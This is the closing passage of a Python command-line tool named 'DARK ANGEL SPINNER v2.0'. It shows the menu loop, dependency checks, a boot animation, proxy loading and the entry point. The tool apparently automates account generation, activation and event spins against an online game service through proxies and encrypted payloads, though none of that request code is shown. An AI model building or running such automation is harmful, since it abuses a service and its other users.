# ══════════════════════════════════════════════════════════════════════════
#  MENU LOOP
# ══════════════════════════════════════════════════════════════════════════

def main_menu_loop():
    """Main interactive loop"""
    while True:
        try:
            print_banner()
            show_main_menu()

            choice = ask_input("Choice", "1", NEXUS.YELLOW).strip()

            if choice == "1":
                handle_full_auto()
            elif choice == "2":
                handle_generate_only()
            elif choice == "3":
                handle_activate_only()
            elif choice == "4":
                handle_spin_only()
            elif choice == "5":
                handle_view_stats()
            elif choice == "6":
                handle_view_files()
            elif choice == "7":
                handle_export_csv()
            elif choice == "0":
                log_angel(f"Thanks for using {_OWNER_NAME}!")
                log_info("Goodbye!")
                print()
                break
            else:
                log_warn(f"Invalid choice: {choice}")
                time.sleep(1)

        except KeyboardInterrupt:
            print()
            if ask_yes_no("Exit application?", default=True):
                log_angel("Goodbye!")
                break
            continue
        except Exception as e:
            log_err(f"Error: {e}")
            log_error_to_file(str(e), "main_menu_loop")
            time.sleep(2)


# ══════════════════════════════════════════════════════════════════════════
#  BANNER PRINTER (used in loop)
# ══════════════════════════════════════════════════════════════════════════

def print_banner(animate: bool = False):
    """Print DARK ANGEL banner"""
    Banner.render(animate=False)
    Banner.credits_panel()


# ══════════════════════════════════════════════════════════════════════════
#  END OF PART 8 of 9
# ══════════════════════════════════════════════════════════════════════════
# ══════════════════════════════════════════════════════════════════════════
#  PART 9 — MAIN ENTRY POINT, BOOT, CLEANUP, ERROR HANDLERS
# ══════════════════════════════════════════════════════════════════════════


# ══════════════════════════════════════════════════════════════════════════
#  STARTUP VALIDATION
# ══════════════════════════════════════════════════════════════════════════

def _validate_setup() -> bool:
    """Validate environment before starting"""
    try:
        # Crypto
        try:
            from Crypto.Cipher import AES as _aes_check
        except ImportError:
            print(f"{NEXUS.RED}[FATAL] pycryptodome missing{NEXUS.RESET}")
            print(f"{NEXUS.YELLOW}Install: pip install pycryptodome{NEXUS.RESET}")
            return False

        # aiohttp
        try:
            import aiohttp as _aio_check
        except ImportError:
            print(f"{NEXUS.RED}[FATAL] aiohttp missing{NEXUS.RESET}")
            print(f"{NEXUS.YELLOW}Install: pip install aiohttp{NEXUS.RESET}")
            return False

        # blackboxprotobuf
        try:
            import blackboxprotobuf as _bb_check
        except ImportError:
            print(f"{NEXUS.RED}[FATAL] blackboxprotobuf missing{NEXUS.RESET}")
            print(f"{NEXUS.YELLOW}Install: pip install blackboxprotobuf{NEXUS.RESET}")
            return False

        # requests
        try:
            import requests as _req_check
        except ImportError:
            print(f"{NEXUS.RED}[FATAL] requests missing{NEXUS.RESET}")
            print(f"{NEXUS.YELLOW}Install: pip install requests{NEXUS.RESET}")
            return False

        return True
    except Exception as e:
        print(f"{NEXUS.RED}[FATAL] Setup validation error: {e}{NEXUS.RESET}")
        return False


# ══════════════════════════════════════════════════════════════════════════
#  DISPLAY STARTUP INFO
# ══════════════════════════════════════════════════════════════════════════

def _show_startup_info():
    """Display startup information"""
    print()
    log_angel(f"Welcome to {_OWNER_NAME}!")
    log_info(f"Version      : {_OWNER_VER}")
    log_info(f"Events       : {len(EVENTS_DATA)}")
    log_info(f"Regions      : {len(REGION_MENU)}")
    log_info(f"Output Dir   : {os.path.basename(RESULT_FOLDER)}/")

    # IND check
    ind_events = list_available_ind_events()
    log_ind(f"IND Events   : {len(ind_events)} available")
    for ev in ind_events:
        payload = get_ind_payload(ev)
        short = payload[:16] + "..." if len(payload) > 16 else payload
        _safe_print(f"     {NEXUS.STEEL}•{NEXUS.RESET} {NEXUS.LIME}{ev}{NEXUS.RESET}  {NEXUS.STEEL}{short}{NEXUS.RESET}")

    print()


# ══════════════════════════════════════════════════════════════════════════
#  BOOT ANIMATION
# ══════════════════════════════════════════════════════════════════════════

def boot_animation():
    """Fancy boot animation"""
    print()
    boot_steps = [
        ("[BOOT]", "Initializing DARK ANGEL core..."),
        ("[BOOT]", "Loading encryption keys..."),
        ("[BOOT]", "Preparing IND region config..."),
        ("[BOOT]", "Loading 5 event payloads..."),
        ("[BOOT]", "Checking proxy configuration..."),
        ("[BOOT]", "Warming up connection pool..."),
        ("[BOOT]", "System ready!"),
    ]

    for tag, msg in boot_steps:
        for i in range(3):
            sys.stdout.write(
                f"\r  {NEXUS.STEEL}{tag}{NEXUS.RESET}  "
                f"{NEXUS.CYAN}{msg}{NEXUS.RESET}   "
            )
            sys.stdout.flush()
            time.sleep(0.08)
        sys.stdout.write(
            f"\r  {NEXUS.LIME}{tag}{NEXUS.RESET}  "
            f"{NEXUS.YELLOW}{msg}{NEXUS.RESET}   \n"
        )
        sys.stdout.flush()
        time.sleep(0.1)

    print()


# ══════════════════════════════════════════════════════════════════════════
#  SAFE CLEANUP
# ══════════════════════════════════════════════════════════════════════════

def _safe_cleanup():
    """Safe cleanup — flush saves, close writers"""
    try:
        save_final_data()
    except Exception:
        pass

    try:
        save_csv()
    except Exception:
        pass


# ══════════════════════════════════════════════════════════════════════════
#  MAIN FUNCTION
# ══════════════════════════════════════════════════════════════════════════

def main():
    """Application entry point"""
    # ── Step 1: Verify credit ──
    if not _verify_credit():
        _show_violation()

    # ── Step 2: Validate setup ──
    if not _validate_setup():
        try:
            input(f"\n  {NEXUS.STEEL}Press Enter to exit...{NEXUS.RESET}")
        except Exception:
            pass
        sys.exit(1)

    # ── Step 3: Install Ctrl+C handler ──
    install_keyboard_handler()

    # ── Step 4: Show banner ──
    Banner.render(animate=False)

    # ── Step 5: Boot animation ──
    boot_animation()

    # ── Step 6: Load proxies ──
    state.proxy_list = []
    proxies_file = os.path.join(CURRENT_DIR, "proxies.txt")
    if os.path.exists(proxies_file):
        try:
            with open(proxies_file, "r", encoding="utf-8") as f:
                for line in f:
                    line = line.strip()
                    if line and not line.startswith("#"):
                        if not line.startswith("http"):
                            line = f"http://{line}"
                        state.proxy_list.append(line)
            if state.proxy_list:
                log_ok(f"Loaded {len(state.proxy_list)} proxies from proxies.txt")
            else:
                log_warn("Empty proxies.txt — DIRECT mode")
        except Exception as e:
            log_warn(f"Proxy load failed: {e}")
    else:
        log_warn("No proxies.txt — DIRECT mode")

    # ── Step 7: Show startup info ──
    _show_startup_info()

    # ── Step 8: Show credits ──
    Banner.credits_panel()

    # ── Step 9: Main loop ──
    time.sleep(0.5)
    main_menu_loop()

    # ── Step 10: Final cleanup ──
    _safe_cleanup()


# ══════════════════════════════════════════════════════════════════════════
#  ENTRY POINT
# ══════════════════════════════════════════════════════════════════════════

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print()
        log_warn("Force stopped by user")
        _safe_cleanup()
    except SystemExit:
        pass
    except Exception as e:
        print()
        log_err(f"Fatal error: {e}")
        try:
            import traceback
            traceback.print_exc()
        except Exception:
            pass
        _safe_cleanup()
    finally:
        print()
        credit = f"👑 {_OWNER_NAME}  ★  {_OWNER_TAG}  ★  {_OWNER_VER}"
        try:
            print(f"  {NEXUS.BOLD}{gradient_text(credit, NEXUS.ANGEL_FLOW, 0)}{NEXUS.RESET}")
        except Exception:
            print(f"  {credit}")
        print()


# ══════════════════════════════════════════════════════════════════════════
#  END OF FILE — DARK ANGEL SPINNER v2.0 COMBINED
#  Total: 9 Parts
#  Owner: 𝕯𝖆𝖗𝖐 𝕬𝖓𝖌𝖊𝖑
# ══════════════════════════════════════════════════════════════════════════